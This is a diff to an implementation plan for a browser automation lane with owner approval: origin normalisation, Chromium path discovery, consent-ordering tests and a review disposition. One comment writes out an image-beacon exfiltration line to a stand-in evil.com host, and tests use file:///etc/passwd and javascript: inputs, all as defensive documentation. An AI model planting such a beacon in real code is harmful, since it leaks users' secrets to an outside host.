@@ -1039,8 +1039,9 @@ git commit -m "feat(computer-use): structural HITL classification from the obser
 - Consumes: `CuBrowserTarget` from `cu-types.ts` (Task 4).
 - Produces:
   - `type CuResourceType = "document" | "sub_frame" | "xhr" | "fetch" | "eventsource" | "websocket" | "stylesheet" | "image" | "font" | "media" | "script" | "other"`
-  - `originOf(url: string): string | null`
-  - `decideRequest(args: { resourceType: CuResourceType; url: string; target: CuBrowserTarget }): { readonly allow: boolean; readonly reason: string }` — Task 7's decorator and Task 9's driver both call this.
+  - `originOf(url: string): string | null` — derives an origin from a live request URL.
+  - `normalizeOrigin(input: string): string | null` — canonicalises an **owner-supplied** origin, or refuses it. Task 10 calls this **before** the approval prompt.
+  - `decideRequest(args: { resourceType: CuResourceType; url: string; target: CuBrowserTarget }): { readonly allow: boolean; readonly reason: string }` — Task 8's decorator and Task 9's driver both call this.
 
 - [ ] **Step 1: Write the failing test**
 
@@ -1048,7 +1049,12 @@ Create `packages/gateway/src/computer-use/cu-request-policy.test.ts`:
 
 ```ts
 import { describe, expect, test } from "bun:test";
-import { type CuResourceType, decideRequest, originOf } from "./cu-request-policy.ts";
+import {
+  type CuResourceType,
+  decideRequest,
+  normalizeOrigin,
+  originOf,
+} from "./cu-request-policy.ts";
 import type { CuBrowserTarget } from "./cu-types.ts";
 
 const target: CuBrowserTarget = {
@@ -1067,6 +1073,45 @@ describe("originOf", () => {
 
   test("returns null for an unparseable url rather than guessing", () => {
     expect(originOf("not a url")).toBeNull();
+  });
+});
+
+describe("normalizeOrigin", () => {
+  test("canonicalises case and a trailing slash", () => {
+    // Without this, an exact `.includes` compares a human-typed string against a URL-derived one
+    // and refuses every navigation to an origin the owner DID approve.
+    expect(normalizeOrigin("https://Example.com/")).toBe("https://example.com");
+    expect(normalizeOrigin("https://EXAMPLE.com")).toBe("https://example.com");
+  });
+
+  test("elides the default port but keeps a non-default one", () => {
+    expect(normalizeOrigin("https://example.com:443")).toBe("https://example.com");
+    expect(normalizeOrigin("https://example.com:8443")).toBe("https://example.com:8443");
+  });
+
+  test("REFUSES a path rather than silently widening it to the whole origin", () => {
+    // `new URL()` would turn this into `https://example.com` — BROADER than what was typed. The
+    // owner scoped to a subdirectory; silently granting the whole site is the wrong direction to
+    // guess in, so it is refused at the point the mistake is made.
+    expect(normalizeOrigin("https://example.com/safe/subdir")).toBeNull();
+    expect(normalizeOrigin("https://example.com/?q=1")).toBeNull();
+    expect(normalizeOrigin("https://example.com/#frag")).toBeNull();
+  });
+
+  test("refuses a non-http(s) scheme", () => {
+    expect(normalizeOrigin("file:///etc/passwd")).toBeNull();
+    expect(normalizeOrigin("javascript:alert(1)")).toBeNull();
+  });
+
+  test("refuses garbage", () => {
+    expect(normalizeOrigin("not a url")).toBeNull();
+  });
+});
+
+describe("decideRequest — normalised origins match", () => {
+  test("a request matches an origin the owner typed with different casing", () => {
+    const t = { navigateOrigins: [normalizeOrigin("https://Example.com/") as string], scriptOrigins: [] };
+    expect(decideRequest({ resourceType: "document", url: "https://example.com/p", target: t }).allow).toBe(true);
   });
 });
 
@@ -1176,6 +1221,15 @@ const SCRIPT_INITIATED: ReadonlySet<CuResourceType> = new Set<CuResourceType>([
  * channel. What the policy buys is that such a channel must be built into the page's markup and
  * is ROWED BY ORIGIN in the ledger — visible after the fact — rather than being available as an
  * invisible one-line `fetch`.
+ *
+ * Concretely, and this is the form to expect rather than a literal markup tag:
+ *
+ *     new Image().src = "https://evil.com/leak?d=" + encodeURIComponent(secret);
+ *
+ * CDP reports that as resource type `image`, so it is ALLOWED here and appends an `authorized`
+ * row naming `https://evil.com`. That row is the entire mitigation. Do not "fix" this by moving
+ * `image` into the gated set — the result is a browser that cannot render pages, and a lane
+ * nobody can use is not a lane that is secure.
  */
 const PASSIVE: ReadonlySet<CuResourceType> = new Set<CuResourceType>([
   "stylesheet",
@@ -1192,6 +1246,35 @@ export function originOf(url: string): string | null {
   } catch {
     return null;
   }
+}
+
+/**
+ * Canonicalise an owner-supplied origin, or REFUSE it. Called by the gate BEFORE the approval
+ * prompt, never after (see the placement note in Task 10 step 6).
+ *
+ * Why this exists: `decideRequest` compares an origin DERIVED from a live request
+ * (`new URL(url).origin` — already lowercased, default port elided, no trailing slash) against a
+ * string a human typed. `https://Example.com/` and `https://example.com` are the same origin and
+ * different strings, so an exact `.includes` would refuse every navigation to an origin the owner
+ * did approve. Fail-closed, but a confusing and total failure.
+ *
+ * A path, query or fragment is REFUSED rather than silently discarded. `new URL()` would happily
+ * turn `https://example.com/safe/subdir` into the origin `https://example.com`, which is BROADER
+ * than what the owner typed — they scoped to a subdirectory and would be granted the whole site,
+ * with the prompt showing the widened value only if they read it carefully. Refusing makes the
+ * mistake visible at the point it is made. Origins are origin-scoped by definition; this policy
+ * cannot express a path scope, so it must not appear to.
+ */
+export function normalizeOrigin(input: string): string | null {
+  let url: URL;
+  try {
+    url = new URL(input);
+  } catch {
+    return null;
+  }
+  if (url.pathname !== "/" || url.search !== "" || url.hash !== "") return null;
+  if (url.protocol !== "https:" && url.protocol !== "http:") return null;
+  return url.origin;
 }
 
 /**
@@ -1238,7 +1321,7 @@ export function decideRequest(args: {
 - [ ] **Step 4: Run test to verify it passes**
 
 Run: `bun test packages/gateway/src/computer-use/cu-request-policy.test.ts`
-Expected: PASS (all cases, including the 4 `test.each` script types and 5 passive types).
+Expected: PASS (all cases, including the 4 `test.each` script types, the 5 passive types, and the 6 `normalizeOrigin` cases).
 
 - [ ] **Step 5: Commit**
 
@@ -1699,6 +1782,9 @@ Expected: FAIL — `Cannot find module './browser.ts'`.
 Create `packages/gateway/src/computer-use/cu-lanes/browser.ts`. Use whichever driver Task 1 approved. With `playwright-core`:
 
 ```ts
+import { existsSync } from "node:fs";
+import { homedir } from "node:os";
+import { isAbsolute, join } from "node:path";
 import type { Database } from "bun:sqlite";
 import { chromium } from "playwright-core";
 import {
@@ -1716,11 +1802,63 @@ import type { CuBrowserTarget } from "../cu-types.ts";
  * closes for the agent emitters.
  */
 
-/** Resolve a system Chromium/Chrome. Returns null when none is installed — the caller refuses. */
+/**
+ * Where a Chromium-family browser lives on each platform, in preference order.
+ *
+ * Zero-config onboarding is a shipped project goal (`nimbus init`, 2026-07-28), so requiring an env
+ * var on a machine that already has Chrome would be friction for no security gain — the path is not
+ * a secret. The env var stays as the ESCAPE HATCH for a non-standard install, and it wins.
+ *
+ * Edge is last on Windows and Linux deliberately: it is Chromium-family and present on every stock
+ * Windows box, so it is what makes the lane work out of the box there, but a user with Chrome
+ * installed should get Chrome.
+ */
+const CHROMIUM_CANDIDATES: Readonly<Record<string, readonly string[]>> = {
+  win32: [
+    join(process.env["PROGRAMFILES"] ?? "C:\\Program Files", "Google\\Chrome\\Application\\chrome.exe"),
+    join(process.env["PROGRAMFILES(X86)"] ?? "C:\\Program Files (x86)", "Google\\Chrome\\Application\\chrome.exe"),
+    // Per-user install — the DEFAULT when Chrome is installed without admin rights, and therefore
+    // extremely common. Omitting it would miss a large share of real machines.
+    join(process.env["LOCALAPPDATA"] ?? "", "Google\\Chrome\\Application\\chrome.exe"),
+    join(process.env["PROGRAMFILES(X86)"] ?? "C:\\Program Files (x86)", "Microsoft\\Edge\\Application\\msedge.exe"),
+  ],
+  darwin: [
+    "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
+    "/Applications/Chromium.app/Contents/MacOS/Chromium",
+    join(homedir(), "Applications/Google Chrome.app/Contents/MacOS/Google Chrome"),
+    "/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge",
+  ],
+  linux: [
+    "/usr/bin/google-chrome",
+    "/usr/bin/google-chrome-stable",
+    "/usr/bin/chromium",
+    "/usr/bin/chromium-browser",
+    "/snap/bin/chromium",
+    "/usr/bin/microsoft-edge",
+  ],
+};
+
+/**
+ * Resolve a system Chromium/Chrome. Returns null when none is found — the caller refuses the lane
+ * at envelope-approval time, BEFORE consent (spec § 3.3 step 4).
+ *
+ * Every candidate is checked for EXISTENCE, not merely composed as a string: a non-existent path
+ * handed to the driver fails deep inside the launch with a message about the browser, not about the
+ * configuration, which is the wrong thing to tell the owner.
+ *
+ * `NIMBUS_CHROMIUM_PATH` must be ABSOLUTE and must exist. Relative is refused rather than resolved,
+ * for the reason `exec-policy.ts` refuses a relative grant path: the gateway's cwd is not the
+ * caller's, so resolving would silently select a real file that is not the one the user named.
+ */
 export function resolveChromiumPath(): string | null {
   const fromEnv = process.env["NIMBUS_CHROMIUM_PATH"];
-  if (fromEnv !== undefined && fromEnv !== "") return fromEnv;
-  return null; // per-OS discovery is added here; null means the lane refuses at approval time
+  if (fromEnv !== undefined && fromEnv !== "") {
+    return isAbsolute(fromEnv) && existsSync(fromEnv) ? fromEnv : null;
+  }
+  for (const candidate of CHROMIUM_CANDIDATES[process.platform] ?? []) {
+    if (candidate !== "" && existsSync(candidate)) return candidate;
+  }
+  return null;
 }
 
 export interface BrowserLane {
@@ -1820,8 +1958,8 @@ export async function openBrowserLane(opts: {
 
 - [ ] **Step 4: Run test to verify it passes**
 
-Run: `NIMBUS_CHROMIUM_PATH=<path to chrome> bun test packages/gateway/src/computer-use/cu-lanes/browser.test.ts`
-Expected: PASS (2 tests), or SKIPPED with no Chromium — verify it *skips* rather than fails.
+Run: `bun test packages/gateway/src/computer-use/cu-lanes/browser.test.ts`
+Expected: PASS (2 tests) on any machine with Chrome/Chromium/Edge in a standard location — the point of the Task 9 fallback list is that this needs no env var. On a machine with none, verify it *skips* rather than fails. `NIMBUS_CHROMIUM_PATH=<abs path>` overrides for a non-standard install.
 
 - [ ] **Step 5: Commit**
 
@@ -1870,6 +2008,9 @@ function deps(over: Partial<CuGateDeps> = {}, spy: Spy = { approvals: 0, actuati
       enforced: { capabilitiesDisabled: new Set<string>() },
       runner: { canConfine: () => null },
       requestApproval: async () => { spy.approvals += 1; return true; },
+      // Injected seams, so these tests run with no browser installed — and so `cu-gate.ts` never
+      // imports the driver, which is what keeps it clear of D26(b).
+      resolveBrowserPath: () => "/fake/chrome",
       openLane: async () => { return laneStub(spy); },
       db,
       now: () => 1000,
@@ -1919,6 +2060,59 @@ describe("openSession — refusals before consent", () => {
     const out = await openSession({ lane: "browser", navigateOrigins: ["https://example.com"], scriptOrigins: [] }, d);
     expect(out.status).toBe("denied");
     expect(s.actuations).toBe(0);
+  });
+
+  test("no browser installed refuses BEFORE consent", async () => {
+    // The analogue of exec's `requireInstalled`: the owner is never asked to approve a session
+    // that could not have started.
+    const s = { approvals: 0, actuations: 0 };
+    const { deps: d } = deps({ resolveBrowserPath: () => null }, s);
+    const out = await openSession({ lane: "browser", navigateOrigins: ["https://example.com"], scriptOrigins: [] }, d);
+    expect(out.code).toBe("ERR_CU_NO_BROWSER");
+    expect(s.approvals).toBe(0);
+  });
+
+  test("an origin carrying a path is refused before consent, not silently widened", async () => {
+    const s = { approvals: 0, actuations: 0 };
+    const { deps: d } = deps({}, s);
+    const out = await openSession(
+      { lane: "browser", navigateOrigins: ["https://example.com/safe/subdir"], scriptOrigins: [] },
+      d,
+    );
+    expect(out.code).toBe("ERR_CU_BAD_ORIGIN");
+    expect(s.approvals).toBe(0);
+  });
+
+  test("the owner approves NORMALISED origins, not the raw strings", async () => {
+    // Placement matters: normalising after approval would show the owner one string and enforce
+    // another. Assert on what the prompt actually received.
+    let seen: readonly string[] = [];
+    const s = { approvals: 0, actuations: 0 };
+    const { deps: d } = deps({
+      requestApproval: async (input: { navigateOrigins: readonly string[] }) => {
+        seen = input.navigateOrigins;
+        s.approvals += 1;
+        return true;
+      },
+    }, s);
+    await openSession({ lane: "browser", navigateOrigins: ["https://Example.com/"], scriptOrigins: [] }, d);
+    expect(seen).toEqual(["https://example.com"]);
+  });
+
+  test("a launch failure AFTER approval records failed_after_approval, not refused_before_consent", async () => {
+    // An auditor reading `refused_before_consent` concludes nothing was approved. Here the owner
+    // approved and a browser very nearly started.
+    const s = { approvals: 0, actuations: 0 };
+    const { deps: d, db } = deps({
+      openLane: async () => { throw new Error("profile directory locked"); },
+    }, s);
+    const out = await openSession({ lane: "browser", navigateOrigins: ["https://example.com"], scriptOrigins: [] }, d);
+    expect(out.status).toBe("refused");
+    const row = db.query<{ hitl_status: string; action_json: string }, []>(
+      `SELECT hitl_status, action_json FROM audit_log WHERE action_type='computer.session' ORDER BY id DESC LIMIT 1`,
+    ).get();
+    expect(row?.hitl_status).toBe("approved");
+    expect(row?.action_json).toContain("failed_after_approval");
   });
 });
 
@@ -2120,10 +2314,55 @@ Create `packages/gateway/src/computer-use/cu-store.ts` with `insertSession(db, {
 
 Create `packages/gateway/src/computer-use/cu-gate.ts` implementing exactly the order in spec § 3.3. Structure it as `openSession()` (steps 1–7) and `runAction()` (per-action steps 1–8), with a module-private `Map<string, { session: CuSession; lane: BrowserLane }>` holding live sessions. Every path — refusal, denial, success, post-approval failure — calls `appendAuditEntry` with `actionType: "computer.action"` (or `"computer.session"`), `hitlStatus` mapped as in spec § 8.2 (**never `not_required`**), and `outcome` in the payload. Mirror `exec-gate.ts`'s `approvedAt` sentinel so a failure *after* approval records `approved`/`failed_after_approval` rather than claiming the owner never saw it.
 
+Four ordering details inside `openSession` that are load-bearing, not incidental:
+
+```ts
+    // (a) NORMALISE ORIGINS BEFORE THE PROMPT, never after. The owner must approve the exact
+    //     values that will be enforced. Normalising inside CuSession's constructor — i.e. after
+    //     approval — would show the owner one string and enforce another; they mean the same
+    //     origin, but "approve exactly what executes" is the principle I33 established when it
+    //     read the script once and refused to re-read it.
+    const navigateOrigins: string[] = [];
+    for (const raw of req.navigateOrigins) {
+      const o = normalizeOrigin(raw);
+      if (o === null) throw new CuGateError("ERR_CU_BAD_ORIGIN", `not a bare origin: ${raw}`);
+      navigateOrigins.push(o);
+    }
+    // …same loop for scriptOrigins.
+
+    // (b) BROWSER PRESENCE CHECK BEFORE CONSENT — the analogue of exec's `requireInstalled`.
+    //     Cheap, and it means the owner is never asked to approve a session that could not start.
+    const executablePath = deps.resolveBrowserPath();
+    if (executablePath === null) {
+      throw new CuGateError("ERR_CU_NO_BROWSER", "no Chromium-family browser found");
+    }
+
+    // (c) …consent here…
+
+    // (d) LAUNCH AFTER CONSENT, and fail-closed if it throws. Launching BEFORE would start a
+    //     browser and create a profile directory for a session the owner may deny.
+    approvedEnvelope = envelope; // the exec-gate `approvedAt` sentinel, by another name
+    let lane: BrowserLane;
+    try {
+      lane = await deps.openLane({ profileDir, executablePath, db: deps.db, sessionId, target });
+    } catch (e) {
+      // The owner DID approve, so this is `approved`/`failed_after_approval` — never
+      // `refused_before_consent`, which would tell an auditor nothing was approved.
+      // A partially-constructed persistent context holds a LOCK on the profile directory; leaving
+      // it would make every subsequent session fail too, with an error about the profile rather
+      // than about this failure. The close is best-effort and its own failure must not mask the
+      // original error.
+      session.close("failed_after_approval", deps.now());
+      throw e;
+    }
+```
+
+`CuGateDeps` therefore carries `resolveBrowserPath: () => string | null` and `openLane: (opts) => Promise<BrowserLane>` as injected seams rather than importing `browser.ts` directly — which is also what lets Task 10's tests run with no browser installed, and what keeps `cu-gate.ts` clear of the driver import D26(b) confines.
+
 - [ ] **Step 7: Run test to verify it passes**
 
 Run: `bun test packages/gateway/src/computer-use/cu-gate.test.ts`
-Expected: PASS (12 tests).
+Expected: PASS (16 tests).
 
 - [ ] **Step 8: Commit**
 
@@ -2726,12 +2965,33 @@ Do not merge while checks are pending — for a repo admin the merge button stay
 
 ---
 
+## Review Disposition (2026-08-30)
+
+Against [`…-browser-review.md`](./2026-08-30-computer-use-slice-1-browser-review.md). Three fixed, one already covered and sharpened. Nothing deferred.
+
+| # | Item | Disposition |
+|---|---|---|
+| Q1 + I1 | Chromium path resolution needs OS fallbacks | **Fixed** — Task 9. Real per-OS candidate lists with existence checks; env var stays the escape hatch and must be absolute. |
+| Q2 | Origin normalisation | **Fixed, placement corrected** — Task 6 (`normalizeOrigin`) + Task 10 step 6(a). Normalised **before** the prompt, and a path-bearing input is **refused**, not widened. |
+| Q3 | Dynamic `new Image().src` exfiltration | **Already covered** — spec § 3.5.1, § 13 bound 3, and a Task 6 test that pins it. Comment sharpened with the concrete idiom. |
+| Q4 | Launch failure handling | **Fixed** — Task 10 step 6(b)/(d). Presence check before consent, launch after, `failed_after_approval` on throw, profile lock released. |
+
+Two of these are worth more than a table row:
+
+**Q1 was a plan-rule violation, not just a gap.** `resolveChromiumPath` shipped as `return null; // per-OS discovery is added here`, which is exactly the "describes what to do without showing how" placeholder the writing-plans skill forbids — an executor reading that task had nothing to implement. The fix adds the real candidate lists, plus two things the review did not name: the **per-user Windows install path** under `%LOCALAPPDATA%`, which is the default when Chrome is installed without admin rights and would therefore have missed a large share of real machines; and an **existence check per candidate**, since a composed-but-absent path fails deep inside the driver with a message about the browser rather than about the configuration.
+
+**Q2's fix belongs before the prompt, not in the constructor.** The review suggested normalising in `CuSession`'s constructor — which runs *after* the owner has approved. That would show the owner `https://Example.com/` and enforce `https://example.com`: the same origin, but it breaks the principle I33 established when it read the script once and refused to re-read it — **approve exactly what will be enforced**. Normalising in the gate before the approval round-trip costs nothing and keeps that property. The second half is a direction the review did not consider: `new URL()` silently turns `https://example.com/safe/subdir` into the origin `https://example.com`, which is *broader* than what the owner typed. Normalising there would widen a grant while looking like tidying, so a path-, query- or fragment-bearing input is refused instead. This policy cannot express a path scope and must not appear to.
+
+**Q3 needed no change and is recorded as such rather than answered with a redundant comment.** The bound is already stated in the spec twice and pinned by a passing test that asserts `evil.com/beacon.png?d=secret` is *allowed*. What the review did contribute is the concrete idiom, which is a better teaching artifact than my prose, so it is now in the source comment along with an explicit "do not fix this by gating `image`" — because the obvious next reader's instinct produces a browser that cannot render pages.
+
+---
+
 ## Self-Review
 
 **Spec coverage.** § 3.1 → Tasks 4–11 (file table matches). § 3.3 order → Task 10 step 6 + Task 10's four refusal tests. § 3.4 envelope → Task 4. § 3.5 sandboxing → Task 9. § 3.5.1 request policy → Tasks 6, 8. § 3.6 → Task 11 (Tauri absence) + Task 13 (enforcement test); **the window-identity tuple is screen-lane and correctly deferred to slice 3.** § 4.1 budgets → Task 4. § 4.2 refuse-not-prompt → Task 10. § 4.3 classifier → Task 5. § 4.3.1 terminal buffering → **slice 2, correctly out of scope.** § 4.4 latch → Task 4. § 5 I11 → Task 12. § 6.1 browser class → Tasks 7, 8. § 6.2 terminal → slice 2. § 6.3 screen/`opaque` → slice 3. § 7 screenshots → Task 9 + Task 13's disk test. § 8.1 consent → Task 10 step 3. § 8.2 audit → Task 10. § 8.3 schema → Task 2. § 8.4 retention → Task 15. § 9 config/CLI → Tasks 3, 14. § 10 policy → Task 10. § 11 I35/D26 → Task 13. § 12 testing → distributed. § 13 bounds → Task 16 PR body. § 16 docs → Task 16.
 
 **Placeholder scan.** No TBD/TODO. Three steps intentionally describe structure rather than transcribing a full file (Task 10 step 5/6, Task 11 step 3, Task 14 step 3) — each names the exact file, the exact model to copy (`exec-gate.ts`, `exec-rpc.ts`, `exec.ts`), and the specific constraints, which is the level at which "similar to Task N" is a pointer to *existing shipped code* rather than to another task.
 
-**Type consistency.** `CuEnvelope`/`CuBrowserTarget`/`CuActionClass`/`CuOutcome`/`CuBudgetVerdict` defined in Task 4 and used unchanged in 5, 6, 8, 10. `ObservedNode`/`BrowserActionInput` defined in Task 5, produced by Task 9's `observe()`, consumed by Task 10. `CuResourceType`/`decideRequest`/`originOf` defined in Task 6, consumed by Task 8. `LedgerableContext`/`LedgerableRoute` defined in Task 8, applied in Task 9. `performActuation` defined in Task 10, confined in Task 13 by the same identifier. `BrowserLane` defined in Task 9, consumed by Task 10.
+**Type consistency.** `CuEnvelope`/`CuBrowserTarget`/`CuActionClass`/`CuOutcome`/`CuBudgetVerdict` defined in Task 4 and used unchanged in 5, 6, 8, 10. `ObservedNode`/`BrowserActionInput` defined in Task 5, produced by Task 9's `observe()`, consumed by Task 10. `CuResourceType`/`decideRequest`/`originOf`/`normalizeOrigin` defined in Task 6, with `decideRequest`+`originOf` consumed by Task 8 and `normalizeOrigin` by Task 10. `resolveBrowserPath`/`openLane` are `CuGateDeps` seams (Task 10) satisfied in production by Task 9's `resolveChromiumPath`/`openBrowserLane` — matching signatures `() => string | null` and `(opts) => Promise<BrowserLane>`. `LedgerableContext`/`LedgerableRoute` defined in Task 8, applied in Task 9. `performActuation` defined in Task 10, confined in Task 13 by the same identifier. `BrowserLane` defined in Task 9, consumed by Task 10.
 
 **One gap deliberately left.** Task 1 can end in a **no-go**, which invalidates Task 9's implementation (not its interface). That is recorded as an explicit stop-and-re-plan rather than smoothed over, because the alternative — writing both a Playwright and a raw-CDP version of Task 9 — doubles the plan to hedge a question one command answers.
